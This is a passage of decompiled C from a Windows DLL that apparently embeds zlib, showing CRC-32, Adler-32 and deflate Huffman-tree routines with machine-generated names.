  }
  (*unaff_EDI)(puVar10,iVar5,pcStack_14,&pcStack_14);
  iVar5 = 0;
  cVar1 = *PTR_DAT_10095e88;
  while (cVar1 != '\0') {
    *(short *)(param_4 + unaff_EBP + iVar5 * 2) = (short)(char)PTR_DAT_10095e88[iVar5];
    iVar5 = iVar5 + 1;
    cVar1 = PTR_DAT_10095e88[iVar5];
  }
  *(undefined2 *)(param_4 + unaff_EBP + iVar5 * 2) = 0;
  (*(code *)(puVar10 + (int)ppuVar11))(&stack0xfffffff0);
  return 1;
}



/* Function: FUN_10002880 */

uint __fastcall FUN_10002880(uint *param_1,uint param_2)

{
  uint in_EAX;
  uint uVar1;
  uint *puVar2;
  uint uVar3;
  
  uVar1 = ~in_EAX;
  if (param_2 != 0) {
    do {
      if (((uint)param_1 & 3) == 0) break;
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_100804c8 + (((byte)*param_1 ^ uVar1) & 0xff) * 4);
      param_1 = (uint *)((int)param_1 + 1);
      param_2 = param_2 - 1;
    } while (param_2 != 0);
  }
  if (0x1f < param_2) {
    uVar3 = param_2 >> 5;
    puVar2 = param_1;
    do {
      uVar1 = uVar1 ^ *puVar2;
      uVar1 = *(uint *)(&DAT_100808c8 + (uVar1 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_10080cc8 + (uVar1 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_100804c8 + (uVar1 >> 0x18) * 4) ^
              *(uint *)(&DAT_100810c8 + (uVar1 & 0xff) * 4) ^ puVar2[1];
      uVar1 = *(uint *)(&DAT_100808c8 + (uVar1 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_10080cc8 + (uVar1 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_100804c8 + (uVar1 >> 0x18) * 4) ^
              *(uint *)(&DAT_100810c8 + (uVar1 & 0xff) * 4) ^ puVar2[2];
      uVar1 = *(uint *)(&DAT_100808c8 + (uVar1 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_10080cc8 + (uVar1 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_100804c8 + (uVar1 >> 0x18) * 4) ^
              *(uint *)(&DAT_100810c8 + (uVar1 & 0xff) * 4) ^ puVar2[3];
      uVar1 = *(uint *)(&DAT_100808c8 + (uVar1 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_10080cc8 + (uVar1 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_100804c8 + (uVar1 >> 0x18) * 4) ^
              *(uint *)(&DAT_100810c8 + (uVar1 & 0xff) * 4) ^ puVar2[4];
      uVar1 = *(uint *)(&DAT_100808c8 + (uVar1 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_10080cc8 + (uVar1 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_100804c8 + (uVar1 >> 0x18) * 4) ^
              *(uint *)(&DAT_100810c8 + (uVar1 & 0xff) * 4) ^ puVar2[5];
      uVar1 = *(uint *)(&DAT_100808c8 + (uVar1 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_10080cc8 + (uVar1 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_100804c8 + (uVar1 >> 0x18) * 4) ^
              *(uint *)(&DAT_100810c8 + (uVar1 & 0xff) * 4) ^ puVar2[6];
      param_1 = puVar2 + 8;
      param_2 = param_2 - 0x20;
      uVar1 = *(uint *)(&DAT_100808c8 + (uVar1 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_10080cc8 + (uVar1 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_100804c8 + (uVar1 >> 0x18) * 4) ^
              *(uint *)(&DAT_100810c8 + (uVar1 & 0xff) * 4) ^ puVar2[7];
      uVar1 = *(uint *)(&DAT_100808c8 + (uVar1 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_10080cc8 + (uVar1 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_100804c8 + (uVar1 >> 0x18) * 4) ^
              *(uint *)(&DAT_100810c8 + (uVar1 & 0xff) * 4);
      uVar3 = uVar3 - 1;
      puVar2 = param_1;
    } while (uVar3 != 0);
  }
  if (3 < param_2) {
    uVar3 = param_2 >> 2;
    do {
      uVar1 = uVar1 ^ *param_1;
      param_1 = param_1 + 1;
      uVar1 = *(uint *)(&DAT_100808c8 + (uVar1 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_10080cc8 + (uVar1 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_100804c8 + (uVar1 >> 0x18) * 4) ^
              *(uint *)(&DAT_100810c8 + (uVar1 & 0xff) * 4);
      param_2 = param_2 - 4;
      uVar3 = uVar3 - 1;
    } while (uVar3 != 0);
  }
  for (; param_2 != 0; param_2 = param_2 - 1) {
    uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_100804c8 + (((byte)*param_1 ^ uVar1) & 0xff) * 4);
    param_1 = (uint *)((int)param_1 + 1);
  }
  return ~uVar1;
}



/* Function: FUN_10002b20 */

undefined4 FUN_10002b20(undefined4 param_1,int param_2)

{
  undefined4 uVar1;
  
  if (param_2 == 0) {
    return 0;
  }
  uVar1 = FUN_10002880();
  return uVar1;
}



/* Function: FUN_10002b40 */

uint FUN_10002b40(uint param_1,byte *param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  uint uVar17;
  uint uVar18;
  
  uVar18 = param_1 >> 0x10;
  param_1 = param_1 & 0xffff;
  if (param_3 == 1) {
    param_1 = param_1 + *param_2;
    if (0xfff0 < param_1) {
      param_1 = param_1 - 0xfff1;
    }
    uVar18 = uVar18 + param_1;
    if (0xfff0 < uVar18) {
      uVar18 = uVar18 - 0xfff1;
    }
    return uVar18 << 0x10 | param_1;
  }
  if (param_2 == (byte *)0x0) {
    return 1;
  }
  if (param_3 < 0x10) {
    if (param_3 != 0) {
      do {
        param_1 = param_1 + *param_2;
        param_3 = param_3 - 1;
        param_2 = param_2 + 1;
        uVar18 = uVar18 + param_1;
      } while (param_3 != 0);
    }
    if (0xfff0 < param_1) {
      param_1 = param_1 - 0xfff1;
    }
    return ((uVar18 / 0xfff1) * 0xf + uVar18) * 0x10000 | param_1;
  }
  if (0x15af < param_3) {
    uVar17 = param_3 / 0x15b0;
    do {
      param_3 = param_3 - 0x15b0;
      iVar1 = 0x15b;
      do {
        iVar2 = param_1 + *param_2;
        iVar3 = iVar2 + (uint)param_2[1];
        iVar4 = iVar3 + (uint)param_2[2];
        iVar5 = iVar4 + (uint)param_2[3];
        iVar6 = iVar5 + (uint)param_2[4];
        iVar7 = iVar6 + (uint)param_2[5];
        iVar8 = iVar7 + (uint)param_2[6];
        iVar9 = iVar8 + (uint)param_2[7];
        iVar10 = iVar9 + (uint)param_2[8];
        iVar11 = iVar10 + (uint)param_2[9];
        iVar12 = iVar11 + (uint)param_2[10];
        iVar13 = iVar12 + (uint)param_2[0xb];
        iVar14 = iVar13 + (uint)param_2[0xc];
        iVar15 = iVar14 + (uint)param_2[0xd];
        iVar16 = iVar15 + (uint)param_2[0xe];
        param_1 = iVar16 + (uint)param_2[0xf];
        uVar18 = uVar18 + iVar2 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 +
                 iVar11 + iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + param_1;
        param_2 = param_2 + 0x10;
        iVar1 = iVar1 + -1;
      } while (iVar1 != 0);
      param_1 = param_1 % 0xfff1;
      uVar18 = uVar18 % 0xfff1;
      uVar17 = uVar17 - 1;
    } while (uVar17 != 0);
  }
  if (param_3 != 0) {
    if (0xf < param_3) {
      uVar17 = param_3 >> 4;
      do {
        iVar1 = param_1 + *param_2;
        iVar2 = iVar1 + (uint)param_2[1];
        iVar3 = iVar2 + (uint)param_2[2];
        iVar4 = iVar3 + (uint)param_2[3];
        iVar5 = iVar4 + (uint)param_2[4];
        iVar6 = iVar5 + (uint)param_2[5];
        iVar7 = iVar6 + (uint)param_2[6];
        iVar8 = iVar7 + (uint)param_2[7];
        iVar9 = iVar8 + (uint)param_2[8];
        iVar10 = iVar9 + (uint)param_2[9];
        iVar11 = iVar10 + (uint)param_2[10];
        iVar12 = iVar11 + (uint)param_2[0xb];
        iVar13 = iVar12 + (uint)param_2[0xc];
        iVar14 = iVar13 + (uint)param_2[0xd];
        iVar15 = iVar14 + (uint)param_2[0xe];
        param_1 = iVar15 + (uint)param_2[0xf];
        param_3 = param_3 - 0x10;
        uVar18 = uVar18 + iVar1 + iVar2 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 +
                 iVar10 + iVar11 + iVar12 + iVar13 + iVar14 + iVar15 + param_1;
        param_2 = param_2 + 0x10;
        uVar17 = uVar17 - 1;
      } while (uVar17 != 0);
    }
    for (; param_3 != 0; param_3 = param_3 - 1) {
      param_1 = param_1 + *param_2;
      param_2 = param_2 + 1;
      uVar18 = uVar18 + param_1;
    }
    param_1 = param_1 % 0xfff1;
    uVar18 = uVar18 % 0xfff1;
  }
  return uVar18 << 0x10 | param_1;
}



/* Function: FUN_10002dc0 */

void __fastcall FUN_10002dc0(undefined4 param_1,int param_2)

{
  undefined2 *puVar1;
  int iVar2;
  
  puVar1 = (undefined2 *)(param_2 + 0x94);
  iVar2 = 0x11e;
  do {
    *puVar1 = 0;
    puVar1 = puVar1 + 2;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined2 *)(param_2 + 0x988);
  iVar2 = 0x1e;
  do {
    *puVar1 = 0;
    puVar1 = puVar1 + 2;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined2 *)(param_2 + 0xa7c);
  iVar2 = 0x13;
  do {
    *puVar1 = 0;
    puVar1 = puVar1 + 2;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  *(undefined4 *)(param_2 + 0x16ac) = 0;
  *(undefined4 *)(param_2 + 0x16a8) = 0;
  *(undefined4 *)(param_2 + 0x16b0) = 0;
  *(undefined4 *)(param_2 + 0x16a0) = 0;
  *(undefined2 *)(param_2 + 0x494) = 1;
  return;
}



/* Function: FUN_10002e30 */

void FUN_10002e30(int param_1)

{
  ushort uVar1;
  ushort uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int in_EAX;
  int iVar6;
  int iVar7;
  int unaff_EDI;
  bool bVar8;
  
  iVar7 = *(int *)(in_EAX + 0x1450);
  iVar3 = *(int *)(in_EAX + 0xb5c + param_1 * 4);
  iVar6 = param_1 * 2;
  bVar8 = SBORROW4(iVar6,iVar7);
  iVar5 = iVar6 - iVar7;
  if (iVar7 < iVar6) {
    *(int *)(in_EAX + 0xb5c + param_1 * 4) = iVar3;
    return;
  }
  do {
    iVar7 = iVar6;
    if (bVar8 != iVar5 < 0) {
      iVar5 = *(int *)(in_EAX + 0xb60 + iVar6 * 4);
      iVar4 = *(int *)(in_EAX + 0xb5c + iVar6 * 4);
      uVar1 = *(ushort *)(unaff_EDI + iVar5 * 4);
      uVar2 = *(ushort *)(unaff_EDI + iVar4 * 4);
      if ((uVar1 < uVar2) ||
         ((uVar1 == uVar2 &&
          (*(byte *)(iVar5 + 0x1458 + in_EAX) <= *(byte *)(in_EAX + 0x1458 + iVar4))))) {
        iVar7 = iVar6 + 1;
      }
    }
    iVar5 = *(int *)(in_EAX + 0xb5c + iVar7 * 4);
    uVar1 = *(ushort *)(unaff_EDI + iVar3 * 4);
    uVar2 = *(ushort *)(unaff_EDI + iVar5 * 4);
    if (uVar1 < uVar2) break;
    if ((uVar1 == uVar2) &&
       (*(byte *)(in_EAX + 0x1458 + iVar3) <= *(byte *)(iVar5 + 0x1458 + in_EAX))) {
      *(int *)(in_EAX + 0xb5c + param_1 * 4) = iVar3;
      return;
    }
    *(int *)(in_EAX + 0xb5c + param_1 * 4) = iVar5;
    iVar4 = *(int *)(in_EAX + 0x1450);
    iVar6 = iVar7 * 2;
    bVar8 = SBORROW4(iVar6,iVar4);
    iVar5 = iVar6 - iVar4;
    param_1 = iVar7;
  } while (iVar6 <= iVar4);
  *(int *)(in_EAX + 0xb5c + param_1 * 4) = iVar3;
  return;
}



/* Function: FUN_10002f00 */

void __fastcall FUN_10002f00(int *param_1)

{
  short sVar1;
  int iVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  int iVar6;
  int in_EAX;
  uint uVar7;
  int iVar8;
  short *psVar9;
  uint uVar10;
  int iVar11;
  int iVar12;
  ushort *puVar13;
  int iVar14;
  uint uVar15;
  int local_20;
  int *local_1c;
  int local_18;
  uint local_14;
  int local_10;
  
  iVar2 = param_1[1];
  iVar3 = *param_1;
  piVar4 = (int *)param_1[2];
  iVar11 = piVar4[1];
  iVar8 = *piVar4;
  iVar5 = piVar4[2];
  uVar10 = piVar4[4];
  *(undefined4 *)(in_EAX + 0xb3c) = 0;
  *(undefined4 *)(in_EAX + 0xb40) = 0;
  *(undefined4 *)(in_EAX + 0xb44) = 0;
  *(undefined4 *)(in_EAX + 0xb48) = 0;
  *(undefined4 *)(in_EAX + 0xb4c) = 0;
  *(undefined4 *)(in_EAX + 0xb50) = 0;
  *(undefined4 *)(in_EAX + 0xb54) = 0;
  *(undefined4 *)(in_EAX + 0xb58) = 0;
  *(undefined2 *)(iVar3 + 2 + *(int *)(in_EAX + 0xb5c + *(int *)(in_EAX + 0x1454) * 4) * 4) = 0;
  iVar14 = *(int *)(in_EAX + 0x1454) + 1;
  local_18 = 0;
  if (iVar14 < 0x23d) {
    local_1c = (int *)(in_EAX + 0xb5c + iVar14 * 4);
    local_10 = 0x23d - iVar14;
    iVar14 = iVar14 + local_10;
    do {
      iVar6 = *local_1c;
      uVar7 = *(ushort *)(iVar3 + 2 + (uint)*(ushort *)(iVar3 + 2 + iVar6 * 4) * 4) + 1;
      if ((int)uVar10 < (int)uVar7) {
        local_18 = local_18 + 1;
        uVar7 = uVar10;
      }
      *(short *)(iVar3 + 2 + iVar6 * 4) = (short)uVar7;
      if (iVar6 <= iVar2) {
        psVar9 = (short *)(in_EAX + 0xb3c + uVar7 * 2);
        *psVar9 = *psVar9 + 1;
        iVar12 = 0;
        if (iVar5 <= iVar6) {
          iVar12 = *(int *)(iVar11 + (iVar6 - iVar5) * 4);
        }
        uVar15 = (uint)*(ushort *)(iVar3 + iVar6 * 4);
        *(int *)(in_EAX + 0x16a8) = *(int *)(in_EAX + 0x16a8) + (uVar7 + iVar12) * uVar15;
        if (iVar8 != 0) {
          *(int *)(in_EAX + 0x16ac) =
               *(int *)(in_EAX + 0x16ac) +
               ((uint)*(ushort *)(iVar8 + 2 + iVar6 * 4) + iVar12) * uVar15;
        }
      }
      local_1c = local_1c + 1;
      local_10 = local_10 + -1;
    } while (local_10 != 0);
    if (local_18 != 0) {
      iVar11 = uVar10 - 1;
      puVar13 = (ushort *)(in_EAX + 0xb3c + uVar10 * 2);
      do {
        psVar9 = (short *)(in_EAX + 0xb3c + iVar11 * 2);
        sVar1 = *(short *)(in_EAX + 0xb3c + iVar11 * 2);
        iVar8 = iVar11;
        while (sVar1 == 0) {
          psVar9 = psVar9 + -1;
          iVar8 = iVar8 + -1;
          sVar1 = *psVar9;
        }
        psVar9 = (short *)(in_EAX + 0xb3c + iVar8 * 2);
        *psVar9 = *psVar9 + -1;
        psVar9 = (short *)(in_EAX + 0xb3e + iVar8 * 2);
        *psVar9 = *psVar9 + 2;
        *puVar13 = *puVar13 - 1;
        local_18 = local_18 + -2;
        local_20 = iVar14;
      } while (0 < local_18);
      for (; uVar10 != 0; uVar10 = uVar10 - 1) {
        uVar7 = (uint)*puVar13;
        if (uVar7 != 0) {
          iVar11 = in_EAX + 0xb5c + iVar14 * 4;
          local_14 = uVar7;
          do {
            iVar8 = *(int *)(iVar11 + -4);
            iVar14 = local_20 + -1;
            iVar11 = iVar11 + -4;
            if (iVar8 <= iVar2) {
              uVar7 = (uint)*(ushort *)(iVar3 + 2 + iVar8 * 4);
              if (uVar7 != uVar10) {
                *(int *)(in_EAX + 0x16a8) =
                     *(int *)(in_EAX + 0x16a8) +
                     (uVar10 - uVar7) * (uint)*(ushort *)(iVar3 + iVar8 * 4);
                *(short *)(iVar3 + 2 + iVar8 * 4) = (short)uVar10;
              }
              uVar7 = local_14 - 1;
              local_14 = uVar7;
            }
            local_20 = iVar14;
          } while (uVar7 != 0);
        }
        puVar13 = puVar13 + -1;
      }
    }
  }
  return;
}



/* Function: FUN_10003120 */

void __thiscall FUN_10003120(int param_1,int param_2)

{
  short *psVar1;
  ushort uVar2;
  int in_EAX;
  int iVar3;
  int iVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  ushort *local_c;
  uint local_8;
  int local_4;
  
  uVar2 = *(ushort *)(in_EAX + 2);
  iVar4 = 0;
  local_8 = 0xffffffff;
  iVar3 = 7;
  iVar5 = 4;
  if (uVar2 == 0) {
    iVar3 = 0x8a;
    iVar5 = 3;
  }
  *(undefined2 *)(in_EAX + 6 + param_1 * 4) = 0xffff;
  if (-1 < param_1) {
    local_c = (ushort *)(in_EAX + 6);
    local_4 = param_1 + 1;
    uVar6 = (uint)uVar2;
    do {
      uVar7 = (uint)*local_c;
      iVar4 = iVar4 + 1;
      if ((iVar3 <= iVar4) || (uVar6 != uVar7)) {
        if (iVar4 < iVar5) {
          psVar1 = (short *)(param_2 + 0xa7c + uVar6 * 4);
          *psVar1 = *psVar1 + (short)iVar4;
        }
        else if (uVar6 == 0) {
          if (iVar4 < 0xb) {
            *(short *)(param_2 + 0xac0) = *(short *)(param_2 + 0xac0) + 1;
          }
          else {
            *(short *)(param_2 + 0xac4) = *(short *)(param_2 + 0xac4) + 1;
          }
        }
        else {
          if (uVar6 != local_8) {
            psVar1 = (short *)(param_2 + 0xa7c + uVar6 * 4);
            *psVar1 = *psVar1 + 1;
          }
          *(short *)(param_2 + 0xabc) = *(short *)(param_2 + 0xabc) + 1;
        }
        iVar4 = 0;
        local_8 = uVar6;
        if (uVar7 == 0) {
          iVar3 = 0x8a;
          iVar5 = 3;
        }
        else if (uVar6 == uVar7) {
          iVar3 = 6;
          iVar5 = 3;
        }
        else {
          iVar3 = 7;
          iVar5 = 4;
        }
      }
      local_c = local_c + 2;
      local_4 = local_4 + -1;
      uVar6 = uVar7;
    } while (local_4 != 0);
  }
  return;
}



/* Function: FUN_10003210 */

void __fastcall FUN_10003210(int param_1,int param_2)

{
  ushort uVar1;
  ushort uVar2;
  int in_EAX;
  byte bVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  uint uVar8;
  int iVar9;
  uint local_14;
  ushort *local_10;
  uint local_c;
  int local_8;
  
  local_c = 0xffffffff;
  iVar4 = 7;
  iVar9 = 4;
  if (*(ushort *)(param_2 + 2) == 0) {
    iVar4 = 0x8a;
    iVar9 = 3;
  }
  if (-1 < param_1) {
    local_10 = (ushort *)(param_2 + 6);
    local_8 = param_1 + 1;
    iVar7 = 0;
    local_14 = (uint)*(ushort *)(param_2 + 2);
    do {
      uVar5 = (uint)*local_10;
      iVar6 = iVar7 + 1;
      if ((iVar4 <= iVar6) || (local_14 != uVar5)) {
        if (iVar6 < iVar9) {
          do {
            uVar8 = (uint)*(ushort *)(in_EAX + 0xa7e + local_14 * 4);
            iVar4 = *(int *)(in_EAX + 0x16bc);
            if ((int)(0x10 - uVar8) < iVar4) {
              uVar1 = *(ushort *)(in_EAX + 0xa7c + local_14 * 4);
              *(ushort *)(in_EAX + 0x16b8) =
                   *(ushort *)(in_EAX + 0x16b8) | uVar1 << ((byte)iVar4 & 0x1f);
              *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
                   *(undefined1 *)(in_EAX + 0x16b8);
              *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
              *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
                   *(undefined1 *)(in_EAX + 0x16b9);
              *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
              iVar4 = *(int *)(in_EAX + 0x16bc) + -0x10;
              *(ushort *)(in_EAX + 0x16b8) =
                   uVar1 >> (0x10U - (char)*(int *)(in_EAX + 0x16bc) & 0x1f);
            }
            else {
              *(ushort *)(in_EAX + 0x16b8) =
                   *(ushort *)(in_EAX + 0x16b8) |
                   *(short *)(in_EAX + 0xa7c + local_14 * 4) << ((byte)iVar4 & 0x1f);
            }
            iVar6 = iVar6 + -1;
            *(uint *)(in_EAX + 0x16bc) = iVar4 + uVar8;
          } while (iVar6 != 0);
        }
        else if (local_14 == 0) {
          iVar4 = *(int *)(in_EAX + 0x16bc);
          bVar3 = (byte)iVar4;
          if (iVar6 < 0xb) {
            uVar1 = *(ushort *)(in_EAX + 0xac2);
            if ((int)(0x10 - (uint)uVar1) < iVar4) {
              uVar2 = *(ushort *)(in_EAX + 0xac0);
              *(ushort *)(in_EAX + 0x16b8) = *(ushort *)(in_EAX + 0x16b8) | uVar2 << (bVar3 & 0x1f);
              *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
                   *(undefined1 *)(in_EAX + 0x16b8);
              *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
              *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
                   *(undefined1 *)(in_EAX + 0x16b9);
              *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
              iVar4 = *(int *)(in_EAX + 0x16bc) + -0x10;
              *(ushort *)(in_EAX + 0x16b8) =
                   uVar2 >> (0x10U - (char)*(int *)(in_EAX + 0x16bc) & 0x1f);
            }
            else {
              *(ushort *)(in_EAX + 0x16b8) =
                   *(ushort *)(in_EAX + 0x16b8) | *(short *)(in_EAX + 0xac0) << (bVar3 & 0x1f);
            }
            iVar4 = iVar4 + (uint)uVar1;
            iVar7 = iVar7 + -2;
            *(int *)(in_EAX + 0x16bc) = iVar4;
            if (iVar4 < 0xe) {
              *(ushort *)(in_EAX + 0x16b8) =
                   *(ushort *)(in_EAX + 0x16b8) | (ushort)(iVar7 << ((byte)iVar4 & 0x1f));
              iVar4 = iVar4 + 3;
LAB_100036d0:
              *(int *)(in_EAX + 0x16bc) = iVar4;
            }
            else {
              *(ushort *)(in_EAX + 0x16b8) =
                   *(ushort *)(in_EAX + 0x16b8) | (ushort)(iVar7 << ((byte)iVar4 & 0x1f));
              *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
                   *(undefined1 *)(in_EAX + 0x16b8);
              *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
              *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
                   *(undefined1 *)(in_EAX + 0x16b9);
              iVar4 = *(int *)(in_EAX + 0x16bc);
              *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
              *(int *)(in_EAX + 0x16bc) = iVar4 + -0xd;
              *(ushort *)(in_EAX + 0x16b8) = (ushort)iVar7 >> (0x10U - (char)iVar4 & 0x1f);
            }
          }
          else {
            uVar1 = *(ushort *)(in_EAX + 0xac6);
            if ((int)(0x10 - (uint)uVar1) < iVar4) {
              uVar2 = *(ushort *)(in_EAX + 0xac4);
              *(ushort *)(in_EAX + 0x16b8) = *(ushort *)(in_EAX + 0x16b8) | uVar2 << (bVar3 & 0x1f);
              *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
                   *(undefined1 *)(in_EAX + 0x16b8);
              *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
              *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
                   *(undefined1 *)(in_EAX + 0x16b9);
              *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
              iVar4 = *(int *)(in_EAX + 0x16bc) + -0x10;
              *(ushort *)(in_EAX + 0x16b8) =
                   uVar2 >> (0x10U - (char)*(int *)(in_EAX + 0x16bc) & 0x1f);
            }
            else {
              *(ushort *)(in_EAX + 0x16b8) =
                   *(ushort *)(in_EAX + 0x16b8) | *(short *)(in_EAX + 0xac4) << (bVar3 & 0x1f);
            }
            iVar4 = iVar4 + (uint)uVar1;
            iVar7 = iVar7 + -10;
            *(int *)(in_EAX + 0x16bc) = iVar4;
            if (iVar4 < 10) {
              *(ushort *)(in_EAX + 0x16b8) =
                   *(ushort *)(in_EAX + 0x16b8) | (ushort)(iVar7 << ((byte)iVar4 & 0x1f));
              iVar4 = iVar4 + 7;
              goto LAB_100036d0;
            }
            *(ushort *)(in_EAX + 0x16b8) =
                 *(ushort *)(in_EAX + 0x16b8) | (ushort)(iVar7 << ((byte)iVar4 & 0x1f));
            *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
                 *(undefined1 *)(in_EAX + 0x16b8);
            *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
            *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
                 *(undefined1 *)(in_EAX + 0x16b9);
            iVar4 = *(int *)(in_EAX + 0x16bc);
            *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
            *(int *)(in_EAX + 0x16bc) = iVar4 + -9;
            *(ushort *)(in_EAX + 0x16b8) = (ushort)iVar7 >> (0x10U - (char)iVar4 & 0x1f);
          }
        }
        else {
          if (local_14 != local_c) {
            uVar8 = (uint)*(ushort *)(in_EAX + 0xa7e + local_14 * 4);
            iVar4 = *(int *)(in_EAX + 0x16bc);
            if ((int)(0x10 - uVar8) < iVar4) {
              uVar1 = *(ushort *)(in_EAX + 0xa7c + local_14 * 4);
              *(ushort *)(in_EAX + 0x16b8) =
                   *(ushort *)(in_EAX + 0x16b8) | uVar1 << ((byte)iVar4 & 0x1f);
              *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
                   *(undefined1 *)(in_EAX + 0x16b8);
              *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
              *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
                   *(undefined1 *)(in_EAX + 0x16b9);
              *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
              iVar4 = *(int *)(in_EAX + 0x16bc) + -0x10;
              *(ushort *)(in_EAX + 0x16b8) =
                   uVar1 >> (0x10U - (char)*(int *)(in_EAX + 0x16bc) & 0x1f);
            }
            else {
              *(ushort *)(in_EAX + 0x16b8) =
                   *(ushort *)(in_EAX + 0x16b8) |
                   *(short *)(in_EAX + 0xa7c + local_14 * 4) << ((byte)iVar4 & 0x1f);
            }
            *(uint *)(in_EAX + 0x16bc) = iVar4 + uVar8;
            iVar6 = iVar7;
          }
          uVar1 = *(ushort *)(in_EAX + 0xabe);
          iVar4 = *(int *)(in_EAX + 0x16bc);
          if ((int)(0x10 - (uint)uVar1) < iVar4) {
            uVar2 = *(ushort *)(in_EAX + 0xabc);
            *(ushort *)(in_EAX + 0x16b8) =
                 *(ushort *)(in_EAX + 0x16b8) | uVar2 << ((byte)iVar4 & 0x1f);
            *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
                 *(undefined1 *)(in_EAX + 0x16b8);
            *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
            *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
                 *(undefined1 *)(in_EAX + 0x16b9);
            *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
            iVar4 = *(int *)(in_EAX + 0x16bc) + -0x10;
            *(ushort *)(in_EAX + 0x16b8) = uVar2 >> (0x10U - (char)*(int *)(in_EAX + 0x16bc) & 0x1f)
            ;
          }
          else {
            *(ushort *)(in_EAX + 0x16b8) =
                 *(ushort *)(in_EAX + 0x16b8) | *(short *)(in_EAX + 0xabc) << ((byte)iVar4 & 0x1f);
          }
          iVar4 = iVar4 + (uint)uVar1;
          iVar6 = iVar6 + -3;
          *(int *)(in_EAX + 0x16bc) = iVar4;
          if (iVar4 < 0xf) {
            *(ushort *)(in_EAX + 0x16b8) =
                 *(ushort *)(in_EAX + 0x16b8) | (ushort)(iVar6 << ((byte)iVar4 & 0x1f));
            iVar4 = iVar4 + 2;
            goto LAB_100036d0;
          }
          *(ushort *)(in_EAX + 0x16b8) =
               *(ushort *)(in_EAX + 0x16b8) | (ushort)(iVar6 << ((byte)iVar4 & 0x1f));
          *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
               *(undefined1 *)(in_EAX + 0x16b8);
          *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
          *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
               *(undefined1 *)(in_EAX + 0x16b9);
          iVar4 = *(int *)(in_EAX + 0x16bc);
          *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
          *(int *)(in_EAX + 0x16bc) = iVar4 + -0xe;
          *(ushort *)(in_EAX + 0x16b8) = (ushort)iVar6 >> (0x10U - (char)iVar4 & 0x1f);
        }
        iVar6 = 0;
        local_c = local_14;
        if (uVar5 == 0) {
          iVar4 = 0x8a;
          iVar9 = 3;
        }
        else if (local_14 == uVar5) {
